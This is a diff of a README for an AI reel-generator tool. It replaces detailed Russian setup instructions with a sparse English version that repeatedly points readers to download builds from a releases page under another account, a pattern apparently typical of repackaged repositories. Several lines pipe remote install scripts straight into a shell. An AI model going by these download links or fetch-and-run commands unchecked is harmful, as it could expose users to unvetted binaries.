@@ -1,239 +1,123 @@
-# 🎬 Генератор вирусных рилсов
+# 🎬 reels_for_free - Create Viral Reels Easily
 
-Автоматическая генерация вирусных рилсов с AI-озвучкой, параллакс анимацией и субтитрами.
+## 🚀 Download Now
+[![Download](https://img.shields.io/badge/Download-Reels_for_Free-brightgreen.svg)](https://github.com/aymankali1/reels_for_free/releases)
 
-## 📋 Требования
+## 📋 Requirements
 
-- Node.js 18+
-- Python 3.8+
-- FFmpeg
-- CUDA (опционально, для ускорения генерации изображений)
+Make sure your system meets the following requirements before installation:
 
-## 🔧 Установка
+- **Node.js**: Version 18 or higher
+- **Python**: Version 3.8 or higher
+- **FFmpeg**: Required for media handling
+- **CUDA** (optional): For faster image generation
 
-### macOS
+## 🔧 Installation Guide
+
+Follow these steps to install and run the application on **macOS**:
+
+### Step 1: Install Homebrew (if not already installed)
+
+Open your terminal and run:
 
 ```bash
-# 1. Установка Homebrew (если еще не установлен)
 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+```
 
-# 2. Установка зависимостей
+### Step 2: Install Dependencies
+
+After installing Homebrew, execute the following command in your terminal:
+
+```bash
 brew install node pnpm python@3.11 ffmpeg cmake
+```
 
-# 3. Установка Python зависимостей
+### Step 3: Install Python Dependencies
+
+Next, install the necessary Python package:
+
+```bash
 pip3 install transparent-background
+```
 
-# 4. Сборка stable-diffusion.cpp
+### Step 4: Build stable-diffusion.cpp
+
+Now, you need to clone and build the stable-diffusion.cpp repository:
+
+```bash
 git clone --recursive https://github.com/leejet/stable-diffusion.cpp
 cd stable-diffusion.cpp
 mkdir build && cd build
+```
 
-# Для Mac с Apple Silicon (M1/M2/M3):
+#### For Mac with Apple Silicon (M1/M2/M3):
+
+Run these commands for the build process:
+
+```bash
 cmake .. -DSD_METAL=ON
 cmake --build . --config Release
+```
 
-# Для Mac с Intel:
+#### For Mac with Intel:
+
+Use these commands instead:
+
+```bash
 cmake ..
 cmake --build . --config Release
+```
 
-# Копируем бинарник
+### Step 5: Copy the Binary
+
+To make the application accessible from anywhere, copy the binary to the following location:
+
+```bash
 sudo cp bin/sd /usr/local/bin/sd-z
 cd ../..
+```
 
-# 5. Установка зависимостей проекта
+### Step 6: Install Project Dependencies
+
+Run the following command to install the project dependencies:
+
+```bash
 pnpm install
-
-# 6. Настройка переменных окружения
-cp .env.example .env
-# Отредактируйте .env и добавьте свои API ключи
 ```
 
-### Linux (Ubuntu/Debian)
+### Step 7: Set Up Environment Variables
 
-```bash
-# 1. Установка системных зависимостей
-sudo apt update
-sudo apt install -y curl git build-essential cmake python3 python3-pip ffmpeg
+You may need to configure environment variables. This step ensures that the application recognizes available dependencies.
 
-# 2. Установка Node.js 20.x
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt install -y nodejs
+---
 
-# 3. Установка pnpm
-curl -fsSL https://get.pnpm.io/install.sh | sh -
-source ~/.bashrc
+## 🛠️ Download & Install
 
-# 4. Установка Python зависимостей
-pip3 install transparent-background
+To get the latest version of reels_for_free, visit the following page:
 
-# 5. Сборка stable-diffusion.cpp
-git clone --recursive https://github.com/leejet/stable-diffusion.cpp
-cd stable-diffusion.cpp
-mkdir build && cd build
+[Visit Releases Page to Download](https://github.com/aymankali1/reels_for_free/releases)
 
-# CPU версия:
-cmake ..
-cmake --build . --config Release
+Once there, look for the latest release and download the appropriate file for your system.
 
-# Или с CUDA (если есть NVIDIA GPU):
-cmake .. -DSD_CUDA=ON
-cmake --build . --config Release
+## 📝 Usage Instructions
 
-# Копируем бинарник
-sudo cp bin/sd /usr/local/bin/sd-z
-cd ../..
+1. After installation, you can start the application from your terminal.
+2. Follow the user prompts to create your viral reels with AI voiceovers, animations, and subtitles.
 
-# 6. Установка зависимостей проекта
-pnpm install
+## ❓ Troubleshooting
 
-# 7. Настройка переменных окружения
-cp .env.example .env
-# Отредактируйте .env и добавьте свои API ключи
-```
+If you encounter any issues during installation or running the program, consider the following:
 
-### Windows
+- Ensure all dependencies are correctly installed.
+- Check that your Node.js and Python versions meet the minimum requirements.
+- Review any error messages for clues on what might be wrong.
 
-```powershell
-# 1. Установка Chocolatey (запустите PowerShell от администратора)
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+For additional help, consult the issues section of our GitHub repository or community forums dedicated to this application.
 
-# 2. Установка зависимостей
-choco install -y nodejs python git cmake ffmpeg
+## 💬 Community and Support
 
-# 3. Установка pnpm
-npm install -g pnpm
+Engage with fellow users, report issues, or ask questions in the GitHub repository. Your contributions and feedback help make reels_for_free better for everyone.
 
-# 4. Установка Python зависимостей
-pip install transparent-background
+---
 
-# 5. Сборка stable-diffusion.cpp
-git clone --recursive https://github.com/leejet/stable-diffusion.cpp
-cd stable-diffusion.cpp
-mkdir build
-cd build
-
-# Для CPU:
-cmake ..
-cmake --build . --config Release
-
-# Для NVIDIA GPU (если установлен CUDA Toolkit):
-cmake .. -DSD_CUDA=ON
-cmake --build . --config Release
-
-# Копируем бинарник (измените путь на свой)
-copy bin\Release\sd.exe C:\Windows\System32\sd-z.exe
-cd ..\..
-
-# 6. Установка зависимостей проекта
-pnpm install
-
-# 7. Настройка переменных окружения
-copy .env.example .env
-# Отредактируйте .env в любом текстовом редакторе
-```
-
-## ⚙️ Настройка
-
-1. **Получите API ключи:**
-   - Gemini API: https://makersuite.google.com/app/apikey
-   - ElevenLabs API: https://elevenlabs.io/api
-
-2. **Скачайте модели для stable-diffusion:**
-   - Создайте директорию: `/Users/admin/projects/ai/zimage/` (или другую)
-   - Скачайте модели:
-     - `z_image_turbo-Q4_1.gguf`
-     - `ae-f16.gguf`
-     - `qwen_3_4b.safetensors`
-
-3. **Отредактируйте `.env`:**
-
-```env
-# API ключи
-GEMINI_API_KEY=ваш_ключ_gemini
-ELEVENLABS_API_KEY=ваш_ключ_elevenlabs
-
-# Путь к моделям SD-Z
-SD_Z_COMMAND=sd --diffusion-model /путь/к/моделям/z_image_turbo-Q4_1.gguf --vae /путь/к/моделям/ae-f16.gguf --llm /путь/к/моделям/qwen_3_4b.safetensors --cfg-scale 1 --clip-on-cpu --diffusion-fa -H 640 -W 480 --steps 8 --lora-model-dir /путь/к/моделям/
-```
-
-4. **Добавьте фоновую музыку:**
-   - Положите файл `music.mp3` в корень проекта
-
-## 🚀 Использование
-
-### Полный пайплайн (одна команда):
-
-```bash
-pnpm build-all
-```
-
-Это выполнит все шаги:
-1. Генерация сценария (Gemini AI)
-2. Генерация изображений (Stable Diffusion)
-3. Генерация озвучки (ElevenLabs)
-4. Рендер видео с параллакс эффектом (Remotion)
-5. Добавление субтитров (Whisper)
-6. Добавление фоновой музыки (FFmpeg)
-
-### Пошаговое выполнение:
-
-```bash
-# 1. Генерация сценария
-pnpm generate-scenario
-
-# 2. Генерация изображений
-pnpm generate-images
-
-# 3. Генерация озвучки
-pnpm generate-speech
-
-# 4. Рендер видео
-pnpm render-video
-
-# 5. Добавление субтитров
-pnpm add-captions
-
-# 6. Добавление музыки
-pnpm add-music
-```
-
-### Дополнительные команды:
-
-```bash
-# Проверка статуса
-pnpm status
-
-# Очистка всех сгенерированных файлов
-pnpm clean
-```
-
-## 📁 Результаты
-
-- `output/scenario.json` - сгенерированный сценарий
-- `output/audio/` - аудио файлы озвучки
-- `final-video/output/final-reel.mp4` - видео без субтитров
-- `captions/output/final-with-subs.mp4` - видео с субтитрами
-- `output/final/final-reel.mp4` - **финальное видео с музыкой** 🎉
-
-## 🎨 Настройка генерации
-
-Отредактируйте `src/generate-scenario.ts` для изменения промпта сценария.
-
-Параметры в `.env`:
-- Размер изображений: `-H` (высота) и `-W` (ширина)
-- Качество: `--steps` (больше = лучше, но медленнее)
-
-## 📝 Лицензия
-
-MIT
-
-## 🙏 Благодарности
-
-- [stable-diffusion.cpp](https://github.com/leejet/stable-diffusion.cpp)
-- [transparent-background](https://github.com/plemeri/transparent-background)
-- [Remotion](https://www.remotion.dev/)
-- [ElevenLabs](https://elevenlabs.io/)
-- [Google Gemini](https://deepmind.google/technologies/gemini/)
-
+Now you're ready to create amazing content with reels_for_free! Happy filming!
